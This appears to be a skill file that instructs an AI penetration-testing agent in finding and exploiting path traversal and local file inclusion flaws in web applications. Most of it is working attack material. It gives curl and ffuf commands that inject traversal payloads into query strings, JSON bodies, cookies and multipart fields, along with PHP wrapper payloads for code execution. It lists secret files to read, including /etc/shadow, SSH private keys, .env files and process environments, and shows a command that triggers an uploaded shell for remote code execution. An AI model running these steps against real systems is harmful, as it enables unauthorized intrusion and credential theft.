---
name: web-path-traversal
description: Discover and exploit directory traversal and local file inclusion vulnerabilities. Load when the target exposes file-serving, download, preview, or template endpoints, or when a parameter appears to reference a filename or path.
metadata:
  requirements:
  - ffuf
  - curl
  - wget
---

# Path Traversal Vulnerabilities

There are two related but distinct vulnerability classes:
 
- **Directory Traversal**: the application reads a file based on user input without restricting the path. Result: arbitrary file read.
- **File Inclusion (LFI)**: the application *loads and executes* a file based on user-controlled input. Result: arbitrary file read + potential RCE escalation via wrappers, log poisoning, or chaining with file upload.

To test successfully you need to know the target OS (Linux vs Windows determines which files to read) and estimate traversal depth (how many `../` levels to the filesystem root from the application directory). Depth is determined empirically with `ffuf` wordlists.
 
Can appear in URL query parameters but also in API body fields, cookies, headers, and multipart form data — do not limit testing to query strings.


### How paths are escaped in different programming languages
 
**PHP**
 
`include()`, `require()`, `file_get_contents()` with user input. PHP is the only language where traversal can escalate to code execution through built-in wrappers.
 
```php
include("pages/" . $_GET['page']);          // direct concatenation
include($_GET['file'] . ".php");            // extension appended — null byte bypass on PHP < 5.3.4
```
 
Wrappers usable with `include()`/`require()`:
```
php://filter/read=convert.base64-encode/resource=<file>  — read PHP source without executing
php://input                                               — execute POST body as PHP (allow_url_include required)
data://text/plain;base64,<b64_payload>                   — execute inline payload (allow_url_include required)
zip://<path_to_zip>#<inner_file.php>                     — execute PHP inside uploaded zip
expect://id                                               — direct RCE (almost never enabled)
```
 
**Python**
 
`os.path.join()` and `open()` / `send_file()` with user input. Two distinct behaviors:
 
```python
os.path.join('/app/files', '../../../etc/passwd')  # → /app/etc/passwd  (partial traversal)
os.path.join('/app/files', '/etc/passwd')          # → /etc/passwd       (absolute path overrides base)
```
 
The absolute path override is critical: if `../` sequences are filtered, try injecting an absolute path directly (`/etc/passwd`).
 
**Node.js**
 
`path.join()` and `fs.readFile()` / `res.sendFile()` with user input. `path.join` resolves `../` without enforcing any boundary:
 
```js
path.join('/app/files', '../../../etc/passwd')  // → /etc/passwd  (traversal works)
path.join('/app/files', '/etc/passwd')          // → /etc/passwd  (absolute overrides)
```
 
`path.normalize()` resolves `../` sequences but does **not** decode percent-encoded characters.
 
**Java**
 
`new File(basePath, userInput)` does not prevent traversal. `getCanonicalPath()` resolves `..` to an absolute path but imposes no security boundary on its own — the secure pattern requires `getCanonicalPath()` followed by a `startsWith(basePath)` check. No execution
primitive.


# Identify Injection Points

Look for any parameter that appears to reference a file or path. Test all of the following surfaces, not just query strings:
 
**URL query parameters** (most common):
```
?file=  ?path=  ?page=  ?template=  ?doc=  ?filename=  ?name=  ?resource=  ?view=
```
 
**URL path segments** (parameter embedded in the path itself):
```
/files/report.pdf          → /files/../../../etc/passwd
/api/v1/users/1/avatar     → the segment after /users/ may be passed to a file operation
```
 
**POST form body** (`application/x-www-form-urlencoded`):
```bash
curl -s -X POST "http://$TARGET/download" --data "filename=../../../etc/passwd" | head -5
```
 
**JSON API body**:
```bash
curl -s -X POST "http://$TARGET/api/export" \
  -H "Content-Type: application/json" \
  -d '{"filename": "../../../etc/passwd"}' | head -5
```
 
**Multipart form data — filename field**:
```
Content-Disposition: form-data; name="file"; filename="../../etc/passwd"
```
 
**Cookie values** — seen in template and session file loading:
```bash
curl -s "http://$TARGET/" --cookie "template=../../../etc/passwd" | head -5
```
 
If you have a **whiteboard tool**, record confirmed injection points before fuzzing:
```
name: traversal_[name...]
description: File parameter found at <endpoint>, input surface: <query|json|cookie|...>
content: endpoint URL, parameter name, evidence of file operation behavior
```

# Identify Traversal Payload

Use `ffuf`, testing hundreds of encoding variants manually is not feasible.
 
**Download wordlists once** (store in `/tmp`, reuse across tasks):
```bash
wget -q -O /tmp/traversal-nix.txt https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/dirTraversal-nix.txt
wget -q -O /tmp/traversal.txt https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/dirTraversal.txt
```
 
**Establish baseline first**, without this the size filter is meaningless:
```bash
BASELINE=$(curl -sk -o /dev/null -w "%{size_download}" "http://$TARGET/endpoint?file=test.txt")
echo "baseline=$BASELINE"
```
 
**Fuzz query parameter**:
```bash
ffuf -u "http://$TARGET/endpoint?file=FUZZ" \
  -w /tmp/traversal-nix.txt \
  -fs $BASELINE \
  -t 40 -s \
  -o /tmp/traversal_out.json -of json
 
# never load raw JSON into context
cat /tmp/traversal_out.json | python3 -c \
  "import json,sys; [print(r['status'], r['length'], r['input']['FUZZ']) \
  for r in json.load(sys.stdin).get('results',[])]" | head -20
```
 
**Fuzz JSON body parameter**:
```bash
BASELINE=$(curl -sk -o /dev/null -w "%{size_download}" -X POST \
  -H "Content-Type: application/json" \
  -d '{"filename":"test.txt"}' "http://$TARGET/api/endpoint")
 
ffuf -u "http://$TARGET/api/endpoint" \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"filename":"FUZZ"}' \
  -w /tmp/traversal-nix.txt \
  -fs $BASELINE \
  -t 20 -s \
  -o /tmp/traversal_json.json -of json
 
cat /tmp/traversal_json.json | python3 -c \
  "import json,sys; [print(r['status'], r['length'], r['input']['FUZZ']) \
  for r in json.load(sys.stdin).get('results',[])]" | head -20
```
 
**Fuzz URL path segment**:
```bash
ffuf -u "http://$TARGET/files/FUZZ" \
  -w /tmp/traversal-nix.txt \
  -fs $BASELINE \
  -t 40 -s \
  -o /tmp/traversal_path.json -of json
```
 
If ffuf returns no hits, the parameter may not be injectable via this endpoint, try other injection points.

If you have a **whiteboard tool**, record the working payload or the failed attempt:
```
name: traversal_[name...]
description: Working traversal payload: <FUZZ_value>, endpoint: <url>, parameter: <name>
content: ffuf command, baseline size, confirmed payload and response size
```

# Exploitation

Before proceding to exploitation attempts, **confirm the vulnerability with `curl`** with a known file (ex. `/etc/passwd`).

Use `--path-as-is` for URL path injection since curl normalizes `../` in paths by default, breaking the exploit. For query parameters and POST body, `--path-as-is` is not needed since curl passes those values as-is.

```bash
# confirm
curl -sk --path-as-is "http://TARGET/endpoint?file=PAYLOAD | head -n 20

# for binary or large files — size check first
curl -sk --path-as-is -o /dev/null -w "size=%{size_download} status=%{http_code}\n" "http://TARGET/endpoint?file=PAYLOAD"
```

## Directory Traversal: Read High-Value Targets

Recall the task objective before choosing targets. Do not read beyond what the objective requires.
 
```
/etc/passwd               # PoC — universally accepted, enumerates users and service accounts
/etc/shadow               # requires root-level read permissions — worth attempting
/proc/self/environ        # runtime environment variables, frequently contains secrets
/proc/self/cmdline        # application startup arguments, may reveal config file paths
/proc/1/environ           # PID 1 environment — useful in containers
~/.ssh/id_rsa             # SSH private key; also try /root/.ssh/id_rsa
.env                      # Python/Node apps — DB credentials, API keys, SECRET_KEY
/var/www/html/config.php  # PHP apps — database credentials (adjust path per webroot)
/etc/nginx/nginx.conf
/etc/apache2/apache2.conf
/etc/httpd/conf/httpd.conf
```
 
Cloud-specific targets (adjust to confirmed provider):
```
/var/task/                # AWS Lambda — application source code root
/var/secrets/             # Azure Functions — mounted secrets
```

If you have a **whiteboard tool**, record each confirmed file read:
```
name: traversal_read_[name...]
description: Read <path> via traversal. Key content: <one-line summary>.
content: curl command used, extracted values relevant to objective
```


## LFI: RCE

Other languages escalation requires file upload chain, Node.js template engines (EJS, Pug), Python (Jinja2, Mako), Java (JSP), and Ruby (ERB) execute loaded files as template/script code. Escalation requires uploading a payload file and then loading it via LFI. If a file upload endpoint exists, load `web-file-upload` and follow its process to upload an executable payload. Return here to trigger it via LFI once the upload path is known:

```bash
# trigger uploaded payload via LFI (adjust path to confirmed upload location)
curl -sk --path-as-is \
  "http://$TARGET/?template=../../../../var/www/html/uploads/shell.ejs" \
  | grep -oP 'uid=\d+\([^)]+\)[^\n]+' | head -3
```
 
If you have a **whiteboard tool**, record after achieving code execution:
```
name: lfi_rce_confirmed
description: RCE via LFI + <technique> on <endpoint>. Execution as <user>.
content: exact payload, trigger URL, confirmed command output
```